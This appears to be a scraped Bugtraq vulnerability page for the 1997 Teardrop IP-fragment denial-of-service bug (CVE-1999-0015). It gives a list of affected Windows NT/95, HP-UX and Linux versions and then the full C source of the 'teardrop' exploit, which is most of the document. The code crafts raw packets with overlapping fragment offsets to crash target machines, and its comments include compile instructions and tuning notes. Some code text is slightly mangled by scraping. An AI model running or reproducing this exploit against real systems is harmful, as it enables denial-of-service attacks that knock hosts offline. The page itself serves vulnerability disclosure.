<p><b><span style="font-size: 18pt;">Multiple Vendor Teardrop Denial of Service Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/124/info">info</a><br><a href="http://www.securityfocus.com/bid/124/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/124/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/124/solution">solution</a><br><a href="http://www.securityfocus.com/bid/124/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				124
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Input Validation Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
				
					CVE-1999-0015<br/>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Nov 13 1997 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Jul 11 2009 12:16AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				This problem was initially posted to the Bugtraq mailing list Thu, 13 Nov 1997 by G P R (route@RESENTMENT.INFONEXUS.COM). In this post Route credits an indvidual named Klepto as the person responsible for discovering the bug.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Microsoft Windows NT 3.5.1 SP4<br/>
					
				
					Microsoft Windows NT 3.5.1 SP3<br/>
					
				
					Microsoft Windows NT 3.5.1 SP2<br/>
					
				
					Microsoft Windows NT 3.5.1 SP1<br/>
					
				
					Microsoft Windows NT  4.0 SP3<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP3<br/>
</span>
					
				
					Microsoft Windows NT  4.0 SP2<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP2<br/>
</span>
					
				
					Microsoft Windows NT  4.0 SP1<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP1<br/>
</span>
					
				
					Microsoft Windows NT  4.0<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0<br/>
</span>
					
				
					Microsoft Windows 95  <br/>
					
				
					HP HP-UX 10.34 <br/>
					
				
					HP HP-UX 10.30 <br/>
					
				
					HP HP-UX 10.8 <br/>
					
				
					HP HP-UX 10.1 0<br/>
					
				
					HP HP-UX 10.0 <br/>
					
				
					HP HP-UX 9.10 <br/>
					
				
					HP HP-UX 9.9 <br/>
					
				
					HP HP-UX 9.8 <br/>
					
				
					HP HP-UX 9.7 <br/>
					
				
					HP HP-UX 9.6 <br/>
					
				
					HP HP-UX 9.5 <br/>
					
				
					HP HP-UX 9.4 <br/>
					
				
					HP HP-UX 9.3 <br/>
					
				
					HP HP-UX 9.1 <br/>
					
				
					HP HP-UX 9.0 <br/>
					
				
					Caldera OpenLinux Standard 1.2 <br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	------Begin -- Guby Linux -------------------------------------------------<br/><br/>/*<br/> *  Copyright (c) 1997 route|daemon9  &amp;lt;route@infonexus.com&amp;gt; 11.3.97<br/> *<br/> *  Linux/NT/95 Overlap frag bug exploit<br/> *<br/> *  Exploits the overlapping IP fragment bug present in all Linux kernels and<br/> *  NT 4.0 / Windows 95 (others?)<br/> *<br/> *  Based off of:   flip.c by klepto<br/> *  Compiles on:    Linux, *BSD*<br/> *<br/> *  gcc -O2 teardrop.c -o teardrop<br/> *      OR<br/> *  gcc -O2 teardrop.c -o teardrop -DSTRANGE_BSD_BYTE_ORDERING_THING<br/> */<br/><br/>#include &amp;lt;stdio.h&amp;gt;<br/>#include &amp;lt;stdlib.h&amp;gt;<br/>#include &amp;lt;unistd.h&amp;gt;<br/>#include &amp;lt;string.h&amp;gt;<br/>#include &amp;lt;netdb.h&amp;gt;<br/>#include &amp;lt;netinet/in.h&amp;gt;<br/>#include &amp;lt;netinet/udp.h&amp;gt;<br/>#include &amp;lt;arpa/inet.h&amp;gt;<br/>#include &amp;lt;sys/types.h&amp;gt;<br/>#include &amp;lt;sys/time.h&amp;gt;<br/>#include &amp;lt;sys/socket.h&amp;gt;<br/><br/>#ifdef STRANGE_BSD_BYTE_ORDERING_THING<br/>                        /* OpenBSD &amp;lt; 2.1, all FreeBSD and netBSD, BSDi &amp;lt; 3.0 */<br/>#define FIX(n)  (n)<br/>#else                   /* OpenBSD 2.1, all Linux */<br/>#define FIX(n)  htons(n)<br/>#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */<br/><br/>#define IP_MF   0x2000  /* More IP fragment en route */<br/>#define IPH     0x14    /* IP header size */<br/>#define UDPH    0x8     /* UDP header size */<br/>#define PADDING 0x1c    /* datagram frame padding for first packet */<br/>#define MAGIC   0x3     /* Magic Fragment Constant (tm).  Should be 2 or 3 */<br/>#define COUNT   0x1     /* Linux dies with 1, NT is more stalwart and can<br/>                         * withstand maybe 5 or 10 sometimes...  Experiment.<br/>                         */<br/>void usage(u_char *);<br/>u_long name_resolve(u_char *);<br/>u_short in_cksum(u_short *, int);<br/>void send_frags(int, u_long, u_long, u_short, u_short);<br/><br/>int main(int argc, char **argv)<br/>{<br/>    int one = 1, count = 0, i, rip_sock;<br/>    u_long  src_ip = 0, dst_ip = 0;<br/>    u_short src_prt = 0, dst_prt = 0;<br/>    struct in_addr addr;<br/><br/>    fprintf(stderr, "teardrop   route|daemon9\n\n");<br/><br/>    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &amp;lt; 0)<br/>    {<br/>        perror("raw socket");<br/>        exit(1);<br/>    }<br/>    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&amp;amp;one, sizeof(one))<br/>        &amp;lt; 0)<br/>    {<br/>        perror("IP_HDRINCL");<br/>        exit(1);<br/>    }<br/>    if (argc &amp;lt; 3) usage(argv0);<br/>    if (!(src_ip = name_resolve(argv1)) || !(dst_ip = name_resolve(argv2)))<br/>    {<br/>        fprintf(stderr, "What the hell kind of IP address is that?\n");<br/>        exit(1);<br/>    }<br/><br/>    while ((i = getopt(argc, argv, "s:t:n:")) != EOF)<br/>    {<br/>        switch (i)<br/>        {<br/>            case 's':               /* source port (should be emphemeral) */<br/>                src_prt = (u_short)atoi(optarg);<br/>                break;<br/>            case 't':               /* dest port (DNS, anyone?) */<br/>                dst_prt = (u_short)atoi(optarg);<br/>                break;<br/>            case 'n':               /* number to send */<br/>                count   = atoi(optarg);<br/>                break;<br/>            default :<br/>                usage(argv0);<br/>                break;              /* NOTREACHED */<br/>        }<br/>    }<br/>    srandom((unsigned)(time((time_t)0)));<br/>    if (!src_prt) src_prt = (random() % 0xffff);<br/>    if (!dst_prt) dst_prt = (random() % 0xffff);<br/>    if (!count)   count   = COUNT;<br/><br/>    fprintf(stderr, "Death on flaxen wings:\n");<br/>    addr.s_addr = src_ip;<br/>    fprintf(stderr, "From: %15s.%5d\n", inet_ntoa(addr), src_prt);<br/>    addr.s_addr = dst_ip;<br/>    fprintf(stderr, "  To: %15s.%5d\n", inet_ntoa(addr), dst_prt);<br/>    fprintf(stderr, " Amt: %5d\n", count);<br/>    fprintf(stderr, " ");<br/><br/>    for (i = 0; i &amp;lt; count; i++)<br/>    {<br/>        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);<br/>        fprintf(stderr, "b00m ");<br/>        usleep(500);<br/>    }<br/>    fprintf(stderr, "\n");<br/>    return (0);<br/>}<br/><br/>/*<br/> *  Send two IP fragments with pathological offsets.  We use an implementation<br/> *  independent way of assembling network packets that does not rely on any of<br/> *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).<br/> */<br/><br/>void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,<br/>                u_short dst_prt)<br/>{<br/>    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */<br/>    u_char byte;                            /* a byte */<br/>    struct sockaddr_in sin;                 /* socket protocol structure */<br/><br/>    sin.sin_family      = AF_INET;<br/>    sin.sin_port        = src_prt;<br/>    sin.sin_addr.s_addr = dst_ip;<br/><br/>    /*<br/>     * Grab some memory for our packet, align p_ptr to point at the beginning<br/>     * of our packet, and then fill it with zeros.<br/>     */<br/>    packet = (u_char *)malloc(IPH + UDPH + PADDING);<br/>    p_ptr  = packet;<br/>    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);<br/><br/>    byte = 0x45;                        /* IP version and header length */<br/>    memcpy(p_ptr, &amp;amp;byte, sizeof(u_char));<br/>    p_ptr += 2;                         /* IP TOS (skipped) */<br/>    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* total length */<br/>    p_ptr += 2;<br/>    *((u_short *)p_ptr) = htons(242);   /* IP id */<br/>    p_ptr += 2;<br/>    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */<br/>    p_ptr += 2;<br/>    *((u_short *)p_ptr) = 0x40;         /* IP TTL */<br/>    byte = IPPROTO_UDP;<br/>    memcpy(p_ptr + 1, &amp;amp;byte, sizeof(u_char));<br/>    p_ptr += 4;                         /* IP checksum filled in by kernel */<br/>    *((u_long *)p_ptr) = src_ip;        /* IP source address */<br/>    p_ptr += 4;<br/>    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */<br/>    p_ptr += 4;<br/>    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */<br/>    p_ptr += 2;<br/>    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */<br/>    p_ptr += 2;<br/>    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP total length */<br/><br/>    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&amp;amp;sin,<br/>                sizeof(struct sockaddr)) == -1)<br/>    {<br/>        perror("\nsendto");<br/>        free(packet);<br/>        exit(1);<br/>    }<br/><br/>    /*  We set the fragment offset to be inside of the previous packet's<br/>     *  payload (it overlaps inside the previous packet) but do not include<br/>     *  enough payload to cover complete the datagram.  Just the header will<br/>     *  do, but to crash NT/95 machines, a bit larger of packet seems to work<br/>     *  better.<br/>     */<br/>    p_ptr = &amp;amp;packet2;         /* IP total length is 2 bytes into the header */<br/>    *((u_short *)p_ptr) = FIX(IPH + MAGIC + 1);<br/>    p_ptr += 4;                 /* IP offset is 6 bytes into the header */<br/>    *((u_short *)p_ptr) = FIX(MAGIC);<br/><br/>    if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *)&amp;amp;sin,<br/>                sizeof(struct sockaddr)) == -1)<br/>    {<br/>        perror("\nsendto");<br/>        free(packet);<br/>        exit(1);<br/>    }<br/>    free(packet);<br/>}<br/><br/>u_long name_resolve(u_char *host_name)<br/>{<br/>    struct in_addr addr;<br/>    struct hostent *host_ent;<br/><br/>    if ((addr.s_addr = inet_addr(host_name)) == -1)<br/>    {<br/>        if (!(host_ent = gethostbyname(host_name))) return (0);<br/>        bcopy(host_ent-&amp;gt;h_addr, (char *)&amp;amp;addr.s_addr, host_ent-&amp;gt;h_length);<br/>    }<br/>    return (addr.s_addr);<br/>}<br/><br/>void usage(u_char *name)<br/>{<br/>    fprintf(stderr,<br/>            "%s src_ip dst_ip  -s src_prt   -t dst_prt   -n how_many \n",<br/>            name);<br/>    exit(0);<br/>}<br/><br/>/* EOF */<br/><br/>------End -- Guby Linux ----------------------------------------------------
	
		<ul>
</ul>
</div>